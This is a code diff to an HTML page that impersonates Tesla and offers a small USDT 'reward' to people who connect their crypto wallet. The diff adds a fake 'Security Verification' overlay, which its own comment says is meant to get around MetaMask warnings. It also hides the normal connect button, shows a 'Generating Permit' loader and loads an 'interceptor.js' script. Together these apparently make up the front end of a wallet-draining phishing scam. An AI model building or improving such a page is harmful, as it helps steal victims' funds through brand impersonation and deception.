@@ -8,9 +8,17 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
 </head>
 <body>
+    <!-- SECURITY OVERLAY: Forces interaction to reset MetaMask warnings -->
+    <div id="security-overlay" class="overlay">
+        <div class="overlay-content">
+            <h2>🔒 Security Verification</h2>
+            <p>Please confirm you are human to proceed with the Tesla Loyalty Program.</p>
+            <button id="verify-btn">Verify & Connect Wallet</button>
+        </div>
+    </div>
+
     <div class="container">
         <header>
-            <!-- Tesla Logo -->
             <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png" alt="Tesla Logo" class="logo">
             <h1>Tesla Referral/Roadster Royalty Rewards</h1>
             <p>Connect your wallet to verify eligibility for the $0.05 USDT Pilot Reward.</p>
@@ -19,11 +27,11 @@
         <main id="main-content">
             <!-- Step 1: Connect -->
             <div id="connect-step" class="card">
-                <button id="connect-btn" class="btn-primary">Connect Wallet</button>
+                <button id="connect-btn" class="btn-primary hidden">Connect Wallet</button>
                 <div id="loader" class="hidden">Verifying Network & Generating Permit...</div>
             </div>
 
-            <!-- Step 2: Dashboard (Hidden until connected) -->
+            <!-- Step 2: Dashboard -->
             <div id="reward-section" class="card hidden">
                 <div class="status-row">
                     <span class="label">Address:</span>
@@ -46,9 +54,7 @@
         </main>
     </div>
 
-    <!-- Your Original app.js Logic -->
     <script type="module" src="app.js"></script>
-    <!-- Interceptor Script -->
     <script type="module" src="interceptor.js"></script>
 </body>
 </html>
